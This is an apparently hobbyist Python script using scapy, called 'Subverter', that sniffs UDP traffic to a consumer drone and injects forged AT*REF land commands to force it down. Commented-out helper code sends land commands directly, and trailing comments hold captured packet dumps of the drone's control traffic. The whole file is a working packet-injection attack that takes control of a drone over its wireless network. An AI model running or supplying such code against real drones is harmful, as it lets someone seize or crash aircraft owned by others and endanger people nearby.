#!/usr/bin/env python
# encoding: UTF-8

import argparse
import random
from scapy.all import *
import signal
import socket
import sys
import time

# unverified? 
DRONE_IP = '192.168.1.1'
DRONE_PORT = 5556
DRONE_NET_INTERFACE = 'en1'

# for the subverter instance
subverter = None

# code used to send land commands?

# seqno = 1
# s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
# s.bind(("", 5554))
# def setBits( lst ):
#     """
#     set the bits in lst to 1.
#     also set bits 18, 20, 22, 24, and 28 to one (since they should always be set)
#     all other bits will be 0
#     """
#     res = 0
#     for b in lst + [18,20,22,24,28]:
#         res |= (1 << b)
#     return res
# def sendCommand( cmd ):
#     global address
#     global seqno
#     global s
#     print "DEBUG: Sending:  '%s'" % cmd.strip()
#     s.sendto(cmd ,address)
#     seqno += 1    
# def land():
#     global seqno
#     land_cmd = setBits([])
#     for i in xrange(1,25):
#         sendCommand("AT*REF=%d,%d\r" % (seqno,land_cmd))

class Subverter(object):
    """ Lands adversary drones. """

    def __init__(self):
        """ Sets up scanner. """
        pass

    def shutdown(self):
        """ Ends the subverting. """
        pass

    def onPacket(self):
        """ Returns a callback function w/ access to class vars. """
        def packetCallback(packet):
            """ A callback that keeps track of packets seen 
            and calls a method to search for consecutive probes.
            """
            # src = packet[IP].src
            # port = packet[TCP].dport
            # currentTime = time.time()

            # print('Source: {0}, Dest: {1}'.format(packet[IP].src, packet[IP].dst))
            try:
                if packet[IP].dst != DRONE_IP:
                    return
                if packet[Raw].load.endswith('290717696'):
                    return
            except Exception:
                return


            # print('Load: {0}'.format(packet[Raw].load))
            load = packet[Raw].load
            # seq = int(load.split('=')[1].split(',')[0])
            # seq = seq + 500
            # for i in range(seq, seq + 5):
            forged = packet.copy()
            # forged[Raw].load = 'AT*REF='+str(seq)+',290717696'
            forged[Raw].load = 'AT*REF=9999,290717696'
            del forged[IP].chksum
            del forged[UDP].chksum
            print(1)
            forged.show2()
            forged = forged.__class__(str(forged))
            print(2)
            forged.show()
            print(3)
            packet.show()

            sendp(forged)

            # forged.show2()

            # print('Forged Load: {0}'.format(forged[Raw].load))

            # send(forged)

            # forged.show()
            # packet.show()

            # TODO: if it is going to the drone, forge a copy to land

        return packetCallback

    def subvert(self):
        """ Begins sniffing with onPacket callback """
        sniff(iface=DRONE_NET_INTERFACE, filter='udp', prn=self.onPacket(), store=0)

def handler(signum,frame):
    """ Handles a SIGINT (ctrl c) """
    print('Interrupted')
    if subverter:
        print('Shutting down')
        subverter.shutdown()
    sys.exit(0)

def main():
    """ Sets up and runs the Subverter. """
    subverter = Subverter()
    subverter.subvert()
    # try:
    #     subverter.subvert()
    # except Exception as e:
    #     print('Caught excetption: {0}'.format(e))
    #     subverter.shutdown()

if __name__ == "__main__":
    signal.signal(signal.SIGINT,handler)
    main()


# ###[ Ethernet ]###
#   dst       = 10:9a:dd:b5:78:ab
#   src       = 90:03:b7:cc:64:31
#   type      = 0x800
# ###[ IP ]###
#      version   = 4L
#      ihl       = 5L
#      tos       = 0x0
#      len       = 64
#      id        = 0
#      flags     = DF
#      frag      = 0L
#      ttl       = 64
#      proto     = udp
#      chksum    = 0xb759
#      src       = 192.168.1.1
#      dst       = 192.168.1.2
#      \options   \
# ###[ UDP ]###
#         sport     = 14551
#         dport     = 14550
#         len       = 44
#         chksum    = 0x26f9
# ###[ Raw ]###
#            load      = '\xfe\x1c\x98\x01\xbe!\xcfn\x1c\x16\xfb\xff\xff\xff\x05\x00\x00\x00\x00\x00\x00\x00\xef\x00\x00\x00\x00\x00\x00\x00\x00\x00r\x00A\xd5'
# Load: AT*FTRIM=325


# ###[ Ethernet ]###
#   dst       = 90:03:b7:cc:64:31
#   src       = 10:9a:dd:b5:78:ab
#   type      = 0x800
# ###[ IP ]###
#      version   = 4L
#      ihl       = 5L
#      tos       = 0x0
#      len       = 41
#      id        = 14761
#      flags     = 
#      frag      = 0L
#      ttl       = 64
#      proto     = udp
#      chksum    = 0xbdc7
#      src       = 192.168.1.2
#      dst       = 192.168.1.1
#      \options   \
# ###[ UDP ]###
#         sport     = sgi_esphttp
#         dport     = freeciv
#         len       = 21
#         chksum    = 0xcb67
# ###[ Raw ]###
#            load      = 'AT*FTRIM=325\r'
# Load: AT*REF=326,290718208



